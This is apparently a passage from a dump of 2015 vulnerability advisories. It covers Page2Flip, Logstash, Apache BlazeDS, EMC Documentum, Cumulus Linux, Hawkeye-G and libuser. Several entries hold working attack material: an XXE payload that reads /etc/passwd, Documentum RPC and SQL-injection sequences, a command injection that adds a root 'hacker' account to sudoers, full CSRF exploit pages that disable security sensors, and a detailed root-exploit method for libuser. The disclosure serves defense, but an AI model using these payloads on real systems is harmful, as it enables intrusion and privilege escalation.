LOYHUvyJm3okpekqHE2ZzUPA5fYq5L2KeNdOidNM7/oUQHj5WYLmRXUbK5glvU4X
+PTZcA6cxDsoK4rsu7AJR+H1lEEaCVbAP+7NOKi0geuVe98IKxuWU1BFOJiIa2Y8
qCh8Sz8HhzWrJDk81ob3fvFDdGrHuMBETlcs/m7EFPNvJMwkOY3BePAQacz+yGRt
dPO8s21bf54II194Db0a
=jPzu
-----END PGP SIGNATURE-----"
4271,SYSS-2015-033: Missing Function Level Access Control (CWE-935) in Page2Flip Premium App 2.5,CWE-935,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-033
Product: Page2Flip
Vendor: w!ssenswerft GmbH
Affected Version(s): Premium App 2.5, probably also in Business App
and Basic App, and in lower versions
Tested Version(s): Premium App 2.5
Vulnerability Type: Missing Function Level Access Control (CWE-935)
Risk Level: High
Solution Status: Open
Vendor Notification: 2015-06-29
Solution Date:
Public Disclosure:
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
With the Page2Flip Web application, it is possible to create e-papers in
PDF format that can be flicked through digitally. Such e-papers can be
used for magazines, catalogues, flyers, etc. (see [1]).
The Page2Flip app allows users to access functionality that should only
be available for administrative users.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified that it is possible for a user with low
privileges, to access functionality that should only be accessible by
administrators, by directly entering the URL.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
For example, by accessing the URL https://[host]/settings/users, all
user names and e-mail addresses can be accessed. Also, by accessing the
URL https://[host]/settings/extended, it is possible to perform the same
actions as high privileged users are able to perform.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-23: Vulnerability discovered
2013-06-29: Vulnerability reported to vendor
2015-07-07: Reported vulnerabilities again as the vendor did not respond
to the first e-mail
2015-07-14: Reminder sent concerning reported vulnerabilities
2015-08-24: Public release of security advisory according to the SySS
Responsible Disclosure Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Page2Flip homepage
http://page2flip.de/
[2] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
Security vulnerability found by Responsible Hacker of the SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJV2x2wAAoJEAylhje9lv8qwtUP/jFVxKdjZ4xWHKiB2wJNIyN2
cbJT29BAYGZjcKCtnJm8B6yfRjAN74RWnuD/2j/MUeUTLylOYYdwU8s5Jgne+qKA
+qdZEHZ60mdxV+09CxGt6FKIvpWXflC7HBK02hrn6ipjmXLjVkXTWtg0pXUZ4Uq7
TjwC8sjUKhEHgIIlI531e4BXaXFcHm5oVq+byKnxWI9zyYLXL67TDxbDO//c4aGd
Wy3jRurTtBx/Ugj8/8sVJ/oIs9MSHolMIKyRhUNDHf1AumgZWDwjFe1lhEPOELAo
qVyUl+q1+52Mk9r8ij0fquTVdZlBg4mlIvnk6cSw83swtSkzmN2L8KdCUZfJHYdW
FcfuUt2iS/ZbYXrv7sYeuVrvfCjvwblFOVakkZtf4VMwiww5Qbg0n6sKGMhRlE6F
zVRjjizEgm4LEy8a1wQTm3M5jaWKnGlb32hHvD1NxDOYl+XjKDY/hye58XufTDf9
/HQyrTpw3YxLe19HODftVqWcDNi6TXmUC2D4d1xhE9dpRo06EwmUx8yGBxQo5Rtd
hG5xG5C+aMbRqKMk451cEW5bfFMOjss/Ij4AL4SQVegs5QHmtgPpXv6BoARpJOKm
w92aazYWGJiIAa6aaSwnTInyuStCwXz3m+HCEWpLuG97Aejh1rlSxdEyMU+NKBLK
PzFMYcFUHie0XHRR/PPv
=bzNQ
-----END PGP SIGNATURE-----"
4276,Logstash vulnerability CVE-2015-5619,,CVE-2015-5619,"Summary:
Logstash 1.5.3 and prior versions are vulnerable to a SSL/TLS security
issue which allows an attacker to successfully implement a man in the
middle attack. This vulnerability is not present in the initial
installation of Logstash. This insecurity is exposed when users
configure Lumberjack output to connect two Logstash instances. In such
deployments, a Logstash instance is used to collect logs from a
webserver and securely transmit them to a central Logstash instance to
perform additional filtering and storing.
Note: Communication between Logstash Forwarder and Lumberjack Input in
Logstash is not affected by this vulnerability.
We have been assigned CVE-2015-5619 for this issue.
Fixed versions:
Version 1.5.4 and 1.4.5 has been patched with a fix that addresses
this vulnerability.
Remediation:
Users that currently use Logstash with the Lumberjack output or may
want to use it in the future should upgrade to 1.5.4 or 1.4.5.
Users that do not want to upgrade can address the vulnerability by
disabling the Lumberjack output.
Credit:
Markus Frosch reported this issue.
CVSS
Overall CVSS score: 4.3"
4296,CVE-2015-3269 Apache Flex BlazeDS Insecure Xml Entity Expansion Vulnerability,,CVE-2015-3269,"CVE-2015-3269 Apache Flex BlazeDS Insecure Xml Entity Expansion Vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Apache Flex BlazeDS 4.7.0
Description: When receiving XML encoded AMF messages containing DTD entities, the
default XML parser configurations allows expanding of entities to local resources.
A request that included a specially crafted request parameter could be used to
access content that would otherwise be protected.
Mitigation: All users of Apache Flex BlazeDS prior to 4.7.1
Example: For an AMF message that contains the following xml payload:
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>
the entity &xxe; would be expanded to the content of the file /etc/passwd.
However this expanded information is not automatically transferred back to
the client, but could be made available by the application.
Credit: This issue was discovered by ﻿Matthias Kaiser of Code White
References: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
Christofer Dutz"
4297,Privilege escalation through RPC commands in EMC Documentum Content Server (incomplete fix in CVE-2015-4532),,CVE-2015-4532,"Product: EMC Documentum Content Server
Vendor: EMC
Version: ANY
CVE: N/A
Risk: High
Status: public/not fixed
For detailed description see attached VRF#HUFG9EBA.txt and VRF#HX5OLZ0F.txt, for vendor announcement see CVE-2015-4532 in http://seclists.org/bugtraq/2015/Aug/86. The problem is PoC code provided in VRF#HUFG9EBA.txt and VRF#HX5OLZ0F.txt misses two obvious points:
1. Content Server supports about 400 undocumented RPC commands, but PoC code covers only 33 of them, for example, all versions of EMC Documentum Content Server support SAVE_CONT_ATTRS_V6 RPC command, this RPC command has the same behaviour as SAVE_CONT_ATTRS from VRF#HUFG9EBA.txt and hence it is vulnerable:
API> retrieve,c,dm_user where user_name=USER
...
11024be980000900
API> get,c,l,user_privileges
...
0
API> get,c,l,i_vstamp
...
1
API> apply,c,11024be980000900,SAVE_CONT_ATTRS_V6,
OBJECT_TYPE,S,dm_user,IS_NEW_OBJECT,B,F,
i_vstamp,I,1,user_privileges,I,16
...
q0
API> ?,c,q0
RESULT
------------
1
API> revert,c,l,
...
OK
API> get,c,l,user_privileges
...
16
2. Creating malicious user with superuser privileges or malicious docbase method is not the only option to escalate privileges, demonstration:
--
-- acquiring r_object_id for brand new
-- dm_registered object
--
API> apply,c,,NEXT_ID_LIST,TAG,I,25,HOW_MANY,I,1
...
q0
API> ?,c,q0
next_id
----------------
19024be98001fd0b
(1 row affected)
--
-- Creating brand new dm_registered object
--
API> apply,c,19024be98001fd0b,SysObjSave,
OBJECT_TYPE,S,dm_registered,
IS_NEW_OBJECT,B,T,
i_vstamp,I,0,
table_name,S,dm_user_s,
table_owner,S,repo,
owner_name,S,repo,
world_permit,I,7,
object_name,S,dm_user_s,
owner_table_permit,I,15,
group_table_permit,I,15,
world_table_permit,I,15,
r_object_type,S,dm_registered
...
q0
API> ?,c,q0
result
------------
1
(1 row affected)
--
-- Now attacker is able to modify database tables
--
API> ?,c,select count(*) from dm_dbo.dm_user_s
count(*)
----------------------
7930
(1 row affected)
API> ?,c,update dm_dbo.dm_user_s set user_privileges=16
where user_name=USER
rows_updated
------------
1
(1 row affected)
API> ?,c,select user_privileges from dm_dbo.dm_user_s
where user_name=USER
user_privileges
---------------
16
(1 row affected)
__
Regards,
Andrey B. Panfilov"
4298,Re: EMC Documentum Content Server: arbitrary code execution (incomplete fix in CVE-2015-4532),,CVE-2015-4532,"Sorry,
previous disclosure contests CVE-2015-4533, though CVE-2015-4532 will be also contested soon.
__
Regards,
Andrey B. Panfilov
-----Original Message----- From: andrew panfilov tel
Sent: Tuesday, August 18, 2015 4:25 AM
To: Bugtraq
Subject: EMC Documentum Content Server: arbitrary code execution (incomplete fix in CVE-2015-4532)
Product: EMC Documentum Content Server
Vendor: EMC
Version: ANY
CVE: N/A
Risk: High
Status: public/not fixed
For detailed description see http://seclists.org/bugtraq/2015/Jul/51
New behavior introduced in CVE-2015-4532:
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin """" 0000000000000000 0000000000000000
0000000000000000 ""0801fd08805c9dfe,'' union select r_object_id
from dm_sysobject where r_object_id=''0801fd08805c9dfe""
0000000000000000 0000000000000000 0000000000000000 """"
0 0 T F T T dmadmin 0000000000000000'
[DM_METHOD_E_METHOD_ARGS_INVALID]error:
""The arguments being passed to the method 'dm_bp_transition' are
invalid:
arguments contain sql keywords which are not allowed.""
New attack vector (note ALL keyword):
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin """" 0000000000000000 0000000000000000
0000000000000000 ""0801fd08805c9dfe,'' union all select r_object_id
from dm_sysobject where r_object_id=''0801fd08805c9dfe""
0000000000000000 0000000000000000 0000000000000000 """"
0 0 T F T T dmadmin 0000000000000000'
__
Regards,
Andrey B. Panfilov"
4304,"CVE-2015-5699 - Cumulus Linux's Switch Configuration Tools Backend, clcmd_server, Vulnerable to Local Privilege Escalation",,CVE-2015-5699,"Title
===================
Cumulus Linux's Switch Configuration Tools Backend, clcmd_server, Vulnerable to Local Privilege Escalation
Summary
===================
Cumulus Linux's Switch Configuration Tools Backend, clcmd_server, is vulnerable to local privilege escalation via Command Injection. Cumulus Linux’s clcmd_server, when receiving commands that end in user supplied labels, will execute any other command appended to the end of it whether it is in the Rosetta or not. And it will do so using its own running credentials which are root.
Affected Products
===================
Cumlus Linux 2.5.3 and Earlier
CVE
===================
CVE-2015-5699
Details
===================
Cumulus Linux's Switch Configuration Tools Backend, clcmd_server, is vulnerable to local privilege escalation via Command Injection. Cumulus Linux’s clcmd_server, when receiving commands that end in user supplied labels, will execute any other command appended to the end of it whether it is in the Rosetta or not. This is because it stops checking the command against the Rosetta when it gets to the label. The label, meta-characters and all, are then passed to the shell for execution. And since clmd_server runs as root it executes both the authorized and the unauthorized command one after the other as root. It is important to note that the second command must begin with a single quote to terminate the command before it and ended with a single quote to close it.
The only limitation to the injection is that it will not work with spaces in the second command. This is because clcmd_server parses the command arguments with spaces. If you put any spaces in your second command, it will see the label as one more command, and fail the operation because it doesn't recognize it. This can easily be overcome by writing a script in your home directory and then calling the script as the second command.
The most potent use of this is a script that creates a root equivalent account. This would allow you, after injection, to su to root-level privileges and take over the system. Since anyone on the system can gain root through this vulnerability, it is considered high impact.
Verification of Vulnerability
===================
The following steps can be carried out in duplicating this vulnerability.
Step 1:
Create the following script in your home directory:
useradd hacker -p $(perl -e'print crypt(""hacker"", ""aa"")') -m
echo 'hacker ALL=(ALL:ALL) ALL' | tee --append /etc/sudoers > /dev/null
Step 2:
sudo cl-rctl ""ip nht set ospf route-map long';/home/lab/script.sh'""
Step 3:
su hacker
Notes:
1. clcmd_server is started by root
2. The user lab was sudo-limited to cl-rctl only
Impact
===================
Unauthorized access. Elevation to root privileges and from there full control of the system.
Credits
===================
Gregory Pickett (@shogun7273), Hellfire Security"
4313,EMC Documentum Content Server: arbitrary code execution (incomplete fix in CVE-2015-4532),,CVE-2015-4532,"Product: EMC Documentum Content Server
Vendor: EMC
Version: ANY
CVE: N/A
Risk: High
Status: public/not fixed
For detailed description see http://seclists.org/bugtraq/2015/Jul/51
New behavior introduced in CVE-2015-4532:
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin """" 0000000000000000 0000000000000000
0000000000000000 ""0801fd08805c9dfe,'' union select r_object_id
from dm_sysobject where r_object_id=''0801fd08805c9dfe""
0000000000000000 0000000000000000 0000000000000000 """"
0 0 T F T T dmadmin 0000000000000000'
[DM_METHOD_E_METHOD_ARGS_INVALID]error:
""The arguments being passed to the method 'dm_bp_transition' are invalid:
arguments contain sql keywords which are not allowed.""
New attack vector (note ALL keyword):
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin """" 0000000000000000 0000000000000000
0000000000000000 ""0801fd08805c9dfe,'' union all select r_object_id
from dm_sysobject where r_object_id=''0801fd08805c9dfe""
0000000000000000 0000000000000000 0000000000000000 """"
0 0 T F T T dmadmin 0000000000000000'
__
Regards,
Andrey B. Panfilov"
4409,Hawkeye-G v3.0.1.4912 CSRF Vulnerability CVE-2015-2878,,CVE-2015-2878,"[+] Credits: John Page ( hyp3rlinx )
[+] Domains: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/AS-HAWKEYEG0724.txt
Vulnerability Type:
===================
CSRF
CVE Reference:
==============
CVE-2015-2878
Vendor:
===================
www.hexiscyber.com
Product:
=====================================================================
Hawkeye-G v3.0.1.4912
Hawkeye G is an active defense disruptive technology that detects,
investigates, remediates and removes cyber threats within the network.
Advisory Information:
====================================================
Multiple CSRF(s) Vulnerabilities:
Vulnerability Details:
=====================
1- CSRF Add arbitrary accounts to system
------------------------------------
vulnerable URL:
https://localhost:8443/interface/rest/accounts/json
vulnerable POST parameter:
'name'
2- CSRF modification of network sensor settings
---------------------------------------------------------------------
a) Turn off 'Url matching' Sensor
b) Turn off 'DNS Inject' Sensor
c) Turn off 'IP Redirect' Sensor
vulnerable URL:
https://localhost:8443/interface/rest/dpi/setEnabled/1
vulnerable POST parameters:
'url_match'
'dns_inject'
'ip_redirect'
3- CSRF whitelisting of malware MD5 hash IDs
------------------------------------------------------
vulnerable URL:
https://localhost:8443/interface/rest/md5-threats/whitelist
vulnerable POST parameter 'id'
CSRF Exploit code(s):
====================
<!DOCTYPE>
<html>
<script>
/* Execute consecutive CSRF exploits */
function ghostofsin(){
var doc=document;
var e1=doc.getElementById('exploit_1')
e1.submit()
var e2=doc.getElementById('exploit_2')
e2.submit()
var e3=doc.getElementById('exploit_3')
e3.submit()
var e4=doc.getElementById('exploit_4')
e4.submit()
}
</script>
<body onLoad=""ghostofsin()"">
<!-- Add arbitrary accounts -->
<form id=""exploit_1"" action=""https://localhost:8443/interface/rest/accounts/json"" method=""post"">
<input type=""text"" name=""human"" value=""true"" />
<input type=""text"" name=""name"" value=""inverted_crosses"" />
<input type=""text"" name=""domainId"" value=""""/>
<input type=""text"" name=""domain_id"" value="""" />
<input type=""text"" name=""roving"" value=""false"" />
</form>
<!-- shutdown the 'Url Matching' Sensor that
is responsible for detecting known malware domains -->
<form id=""exploit_2"" action=""https://localhost:8443/interface/rest/dpi/setEnabled/1"" method=""post"">
<input type=""text"" name=""level"" value=""1"" />
<input type=""text"" name=""enable"" value=""false"" />
<input type=""text"" name=""attribute"" value=""url_match""/>
</form>
<!-- set the DNS Inject Network Sensor to off -->
<form id=""exploit_3"" action=""https://localhost:8443/interface/rest/dpi/setEnabled/1"" method=""post"">
<input type=""text"" name=""level"" value=""1"" />
<input type=""text"" name=""enable"" value=""false"" />
<input type=""text"" name=""attribute"" value=""dns_inject""/>
</form>
<!-- set the IP Redirect Network Sensor to off -->
<form id=""exploit_4"" action=""https://localhost:8443/interface/rest/dpi/setEnabled/1"" method=""post"">
<input type=""text"" name=""level"" value=""1"" />
<input type=""text"" name=""enable"" value=""false"" />
<input type=""text"" name=""attribute"" value=""ip_redirect""/>
</form>
</body>
</html>
Whitelist MD5 malware IDs CSRF:
-------------------------------
In final CSRF POC to try an white list malware MD5 IDs will be a bit more complex,
we need to submit form many times hidden in background using iframe so we stay on same page.
Seems all MD5 ID's end in 0001 and are 8 bytes in length, we just need a loop an create some
numbers 8 bytes long and dynamically assign the 'id' value of the field and execute multiple
POST requests in background, it will be hit or miss unless you know ahead of time the MD5 ID
in the database your targeting.
e.g. Malware MD5 database ID 28240001
So Here we go!...
<!-- whitelist MD5 malware IDs -->
<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN""
""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<title>CSRF POC hyp3rlinx</title>
<meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"">
</head>
<body>
<form id=""hell"" action=""https://localhost:8443/interface/rest/md5-threats/whitelist"" target=""demonica"" method=""post"">
<input type=""hidden"" name=""id"" id=""id""><br>
</form>
<IFRAME style=""display:none"" name=""demonica""></IFRAME>
<script>
var doc=document
var x=1000
function exorcism(){
x++
x=x+001
x=String(x)
var f=doc.getElementById('hell')
var e=doc.getElementById('id')
e.value=x
f.submit()
}
setInterval(""exorcism()"",100)
</script>
</body>
</html>
Disclosure Timeline:
=========================================================
Vendor Notification: June 30, 2015
July 24, 2015 : Public Disclosure
Severity Level:
=========================================================
High
Description:
==========================================================
Request Method(s): [+] POST
Vulnerable Product: [+] Hawkeye-G v3.0.1.4912
Vulnerable Parameter(s): [+] name, enable, id
Affected Area(s): [+] Network Threat Appliance, Local Domain
============================================================================
[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
(hyp3rlinx)"
4411,Qualys Security Advisory - CVE-2015-3245 userhelper - CVE-2015-3246 libuser,,CVE-2015-3245,"Hello, it is July 23, 2015, 17:00 UTC, the Coordinated Release Date for
CVE-2015-3245 and CVE-2015-3246. Please find our advisory below, and
our exploit attached.
Qualys Security Advisory
CVE-2015-3245 userhelper chfn() newline filtering
CVE-2015-3246 libuser passwd file handling
--[ Summary ]-----------------------------------------------------------------
The libuser library implements a standardized interface for manipulating
and administering user and group accounts, and is installed by default
on Linux distributions derived from Red Hat's codebase. During an
internal code audit at Qualys, we discovered multiple libuser-related
vulnerabilities that allow local users to perform denial-of-service and
privilege-escalation attacks. As a proof of concept, we developed an
unusual local root exploit against one of libuser's applications.
----[ Vulnerability #1 (CVE-2015-3245 userhelper chfn() newline filtering)
We discovered a bug in userhelper, a setuid-root program from the
usermode package that provides a basic interface to change a user's
password, gecos information, and shell; its -f (Full Name), -o (Office),
-p (Office Phone) and -h (Home Phone) command-line options are
equivalent to those of the traditional chfn program.
userhelper's chfn() function verifies that the fields it was given on
the command-line are sane (i.e., contain no forbidden characters).
Unfortunately, these forbidden characters ("":,="") do not include ' '
and allow local attackers to inject newline characters into /etc/passwd
and alter this file in unexpected ways.
To the best of our knowledge, this bug is a local denial-of-service
only: we were not able to turn it into a local root exploit, but maybe
some creative minds will.
There is another, secondary aspect of this bug: userhelper depends on
libuser to modify /etc/passwd, and libuser's format_generic() and
generic_setpass() functions reject fields containing a ':' that would be
interpreted as a field separator. Vulnerability #1 could have been
prevented if libuser had also rejected ' ' characters.
----[ Vulnerability #2 (CVE-2015-3246 libuser passwd file handling)
We discovered a bug in libuser itself: even though traditional programs
like passwd, chfn, and chsh work on a temporary copy of /etc/passwd and
eventually rename() it, libuser modifies /etc/passwd directly.
Unfortunately, if anything goes wrong during these modifications,
libuser may leave /etc/passwd in an inconsistent state.
This bug is not just another local denial-of-service: we were able to
turn it into a local root exploit against userhelper and chfn (if linked
with libuser).
There is also another, secondary aspect of this bug: glibc modules like
nss and nscd do not expect /etc/passwd to be directly modified while
they parse its contents, and programs from packages like shadow-utils
and util-linux use lckpwdf() locks that are incompatible with libuser's
fcntl() locks.
--[ Exploitation Overview ]---------------------------------------------------
In this section, we outline our userhelper exploit against libuser's
Vulnerability #2; later in this advisory, we explain how it can be
easily adapted to chfn (if linked with libuser).
Our ultimate goal is to inject an arbitrary line into /etc/passwd (for
example, the a-line "" a::0:0::/: "") but we first need to understand
how libuser's generic_mod() function modifies our own user's line in
/etc/passwd:
- open() /etc/passwd for reading and writing (O_RDWR, but not O_APPEND
nor O_TRUNC);
- acquire the file's fcntl() write-lock (an exclusive, but advisory
lock);
- read() the file's contents (into a g_malloc()ated buffer);
- lseek() the file to the beginning of our user's line (and skip the
unmodified lines that precede);
- write() our user's new, modified line (and the rest of the unmodified
lines that follow) to the file;
- ftruncate() the file (if our user's new, modified line is shorter than
the old one);
- release the file's fcntl() write-lock;
- close() the file.
Surprisingly, we only need two things in our toolbox in order to exploit
this function and inject the a-line into /etc/passwd:
- a pencil and eraser that allows us to repeatedly write() and
re-write() our own GECOS field (its length and last character in
particular) in /etc/passwd: the userhelper program itself;
- a pair of scissors that allows us to interrupt write() with byte
precision and avoid ftruncate(): the resource limit RLIMIT_FSIZE, ""The
maximum size of files that the process may create. Attempts to extend
a file beyond this limit result in delivery of a SIGXFSZ signal. By
default, this signal terminates a process, but a process can catch
this signal instead, in which case the relevant system call (e.g.,
write(2), truncate(2)) fails with the error EFBIG.""
For each character in the a-line (beginning with its last character and
ending with its first character), we fork() a new process and execve()
userhelper with:
- a GECOS field that allows us to write() the character to its target
offset in /etc/passwd;
- an RLIMIT_FSIZE that allows us to terminate the process before it
write()s or ftruncate()s the characters that follow.
In this example, the newline character ' ' is represented by |, and the
last character written (before write() is interrupted by RLIMIT_FSIZE)
is marked with ^:
...|...|user:x:1000:1000::/home/user:/bin/bash|...|...|
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAA:/home/user:/bin/bash|...|...|
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAA:/home/user:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/home/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0:0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:0:0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA::0:0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa::0:0::/:|...|...|
^
...|...|user:x:1000:1000:AAAAAAAA:/home/user:/bin/bash|a::0:0::/:|...|...|
^
...|...|user:x:1000:1000::/home/user:/bin/bash|a::0:0::/:|...|...|
--[ Exploitation Details ]----------------------------------------------------
In this section, we discuss the problems we encountered while developing
our userhelper exploit, and how we solved them.
----[ Problem #1 (missing fields)
At the end of our ""Exploitation Overview"" example, our home-directory
and shell-program fields seem to magically reappear in /etc/passwd,
although they were previously cut out by RLIMIT_FSIZE.
This magic trick introduces Problem #1: we cannot simply fork() a new
process for each character in the a-line, execve() userhelper, and let
it run until the character is written to its target offset in
/etc/passwd, because libuser refuses to modify our user's line if some
of its fields are missing.
In order to solve this Problem #1, we fork() a new process for each
character in the a-line, execve() userhelper, and let it load our user's
original, uncut line from /etc/passwd, but we SIGSTOP the process before
it open()s /etc/passwd for writing. Only after we have started and
stopped all userhelper processes can we safely SIGCONT them, one at a
time.
----[ Problem #2 (backup file)
Before libuser open()s /etc/passwd for writing, it creates a backup file
named /etc/passwd- and if this backup fails, libuser refuses to modify
/etc/passwd. Unfortunately, our RLIMIT_FSIZE also applies to the backup,
which will fail if the RLIMIT_FSIZE is less than the size of
/etc/passwd.
This introduces Problem #2: in apparent contradiction to what we just
said, our exploit needs to decrease RLIMIT_FSIZE after each character it
injects into /etc/passwd (as shown in the ""Exploitation Overview""
example).
In order to solve this Problem #2, we refine Problem #1's
SIGSTOP/SIGCONT solution: we let each userhelper process load our user's
original, uncut line from /etc/passwd, and SIGSTOP the process after it
creates the backup file but before it modifies /etc/passwd. In other
words, we have to win a race against generic_mod()'s system calls, which
create the backup file and modify /etc/passwd:
- open() the passwd file /etc/passwd for reading;
- acquire the passwd file's fcntl() read-lock;
- open() the backup file /etc/passwd- for writing;
- acquire the backup file's fcntl() write-lock;
- read() from the passwd file;
- write() to the backup file;
- ftruncate() the backup file;
- release the backup file's fcntl() write-lock;
- close() the backup file;
- release the passwd file's fcntl() read-lock;
- close() the passwd file;
- open() /etc/passwd for reading and writing;
[RACE WINDOW BEGINS]
- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
- acquire the file's fcntl() write-lock: failure, sleep for a few microseconds;
[RACE WINDOW ENDS]
- acquire the file's fcntl() write-lock: success;
- read() the file's contents;
- etc.
In order to reliably win this race against all userhelper processes (one
for each character in the a-line), we:
- widen the race window. We acquire a read-lock on /etc/passwd before we
execve() userhelper, which prevents libuser from acquiring the
write-lock on /etc/passwd, and forces it to sleep for a few
microseconds (LU_LOCK_TIMEOUT is 2, LU_MAX_LOCK_ATTEMPTS is 6).
- pinpoint the race window. We monitor the filesystem for the following
sequence of inotify events:
. IN_CREATE on /etc if the backup file does not exist;
. IN_CLOSE_WRITE on the backup file;
. IN_CLOSE_NOWRITE on the passwd file;
. IN_OPEN on the passwd file.
- preempt the userhelper processes. We setpriority() them to the lowest
priority, sched_setscheduler() them to SCHED_IDLE, and
sched_setaffinity() them to the same CPU as our exploit.
----[ Problem #3 (last user)
If our user's line is the last one in /etc/passwd, then the last
character we inject into the file (the ' ' that ends our user's line
and begins the a-line) is also the very last character of write()'s
buffer, which introduces Problem #3: this last write() will not exceed
our RLIMIT_FSIZE, and the consequent ftruncate() will delete the a-line
from the end of /etc/passwd.
In order to solve this Problem #3:
- either we SIGKILL the last userhelper process after write() but before
ftruncate(). We reliably win this race with an IN_MODIFY event on
/etc/passwd and the ""same CPU, different priorities"" preemption of
userhelper.
- or we exploit Vulnerability #1 and inject a ' ' into our own GECOS
field. As far as libuser is concerned, this ' ' ends our user's line
and begins a new one (with our leftover home-directory and
shell-program fields): our user's line is no longer the last one in
/etc/passwd.
----[ Problem #4 (maximum GECOS_LENGTH)
As shown in our ""Exploitation Overview"" example, we only have two
options for arbitrary character injection into /etc/passwd:
- either we use a character that we artificially inject through our own
GECOS field (not an option for characters like ':' and ' ');
- or we reuse a character that is naturally present in /etc/passwd (our
only option for characters like ':' and ' ').
Unfortunately, both of these options might fail to inject a character
after the end of /etc/passwd (a consequence of Problem #2):
- if our own GECOS field is too far away from the end of /etc/passwd
(farther than userhelper's maximum GECOS_LENGTH, 127 characters);
- if the character is not already one of the last GECOS_LENGTH
characters in /etc/passwd.
If faced with both of these problems, we solve the first one (and
Problem #4) by repeatedly deleting lines from the end of /etc/passwd,
until our own user's line is the last one in the file: we enlarge our
own GECOS field, delete characters from the end of /etc/passwd with our
RLIMIT_FSIZE scissors, shrink our GECOS field again, repeat.
----[ Problem #5 (time complexity)
For each character in the a-line, we usually have to choose one of
several (GECOS, RLIMIT_FSIZE) pairs that allow us to write the character
to its target offset in /etc/passwd.
These pairs represent the nodes of a search tree that grows
exponentially (with the number of characters in the a-line) but may
contain few or no solutions. In order to avoid this tree's worst-case
time complexity, we:
- inject the shortest a-line possible, "" a::0:0::/: "";
- perform a recursive depth-first search on the tree, and return the
first solution we find (instead of, for example, the solution that
minimizes /etc/passwd's alterations);
- replace the a-line's username with a wildcard, and accept any
lowercase character that is not already a username (the a-line's
username was a major problem, because it is the last character we
inject, and therefore occurs deep down the tree's branches; the
a-line's '0' characters are only a minor problem, because they occur
